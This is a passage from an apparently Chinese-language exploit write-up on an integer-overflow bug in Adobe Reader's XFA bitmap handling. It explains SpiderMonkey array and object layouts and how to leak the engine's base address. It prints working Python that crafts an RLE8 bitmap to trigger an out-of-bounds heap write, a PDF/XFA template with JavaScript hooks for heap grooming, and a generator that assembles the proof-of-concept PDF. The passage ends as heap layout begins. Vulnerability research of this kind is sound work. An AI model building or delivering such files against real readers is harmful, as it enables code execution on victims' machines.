<p><code>Array</code> 对象元素存储区的内存布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure>
<p>这里 <code>array[0]</code> 和 <code>array[14]</code> 的值都是 <code>41424344 ffffff81</code> ，其中标签 <code>0xFFFFFF81</code> 表示元素的类型为 <code>INT32</code> 。而 <code>array[1]</code> 到 <code>array[13]</code> 之间的所有元素都被填充为 <code>00000000 ffffff84</code> ，表示这些元素当前是未定义的（即 <code>undefined</code> ）。</p>
<p>对 <code>Array</code> 而言，如果可以通过触发漏洞更改 <code>capacity</code> 和 <code>length</code> 的值，那么就可以实现越界写操作：仅仅是越界写，因为 <code>initializedLength</code> 不变的话越界读取的元素全部为 <code>undefined</code> ，同时一旦进行越界写操作，<code>initializedLength</code> 之后到越界写之前的所有元素都会被填充为 <code>00000000 ffffff84</code> ，控制不好的话很容导致进程崩溃。</p>
<p>那么如果同时更改 <code>initializedLength</code> 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为 <code>initializedLength</code> 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC 过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。</p>
<h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 <code>JSObject</code> ，后者又继承自 <code>ObjectImpl</code> ，相关定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>对某些对象（比如 <code>DataView</code> ）而言， <code>elements</code> 的值是没有意义的，因此会指向一个静态全局变量  <code>emptyElementsHeader</code> ，读取这些对象的 <code>elements</code> 的值可以用于泄露 JavaScript 引擎模块的基地址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure>
<h3 id="5-3-位图构造"><a href="#5-3-位图构造" class="headerlink" title="5.3 位图构造"></a>5.3 位图构造</h3><p>如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>这里直接创建一个 RLE8 位图文件，相关参数如下：</p>
<ul>
<li>宽度为 <code>0xF0</code> </li>
<li>高度为 <code>1</code> </li>
<li>位数为 <code>8</code> </li>
</ul>
<p>对该位图而言，用于存储位图数据的堆块的大小将会是 <code>0xF0</code> ，而函数 <code>get_bitmap_data</code> 中指定的位图数据将使得我们可以向低地址方向越界写 <code>0xF4</code> 字节的数据，其中数据全部为 <code>0x10</code> 。</p>
<h3 id="5-4-PDF-构造"><a href="#5-4-PDF-构造" class="headerlink" title="5.4 PDF 构造"></a>5.4 PDF 构造</h3><p>下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>
<p>为了触发整数溢出，前面构造的位图文件的大小将超过 <code>60MB</code> ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF 文件相当大。为了压缩 PDF 文件的大小，可以给对象 <code>6 0 obj</code> 指定一个 <code>Filter</code> （这里为 <code>FlateDecode</code> ）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。</p>
<p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 <code>subform</code> 的 <code>initialize</code> 事件和 <code>docReady</code> 事件设置事件处理代码来完成。</p>
<p>下面的 Python 代码可以用于生成 PDF 文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
<h3 id="5-5-利用技巧"><a href="#5-5-利用技巧" class="headerlink" title="5.5 利用技巧"></a>5.5 利用技巧</h3><h4 id="5-5-1-内存布局-1"><a href="#5-5-1-内存布局-1" class="headerlink" title="5.5.1 内存布局 (1)"></a>5.5.1 内存布局 (1)</h4><p>这里借助 <code>ArrayBuffer</code> 来完成内存布局。</p>
<p>因为位图解析过程中创建的堆块大小为 <code>0xF0</code> 字节，因此 <code>ArrayBuffer</code> 的 <code>byteLength</code> 可以设置为 <code>0xE0</code> 。为了创建内存空洞，可以先创建大量的 <code>ArrayBuffer</code> 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p>
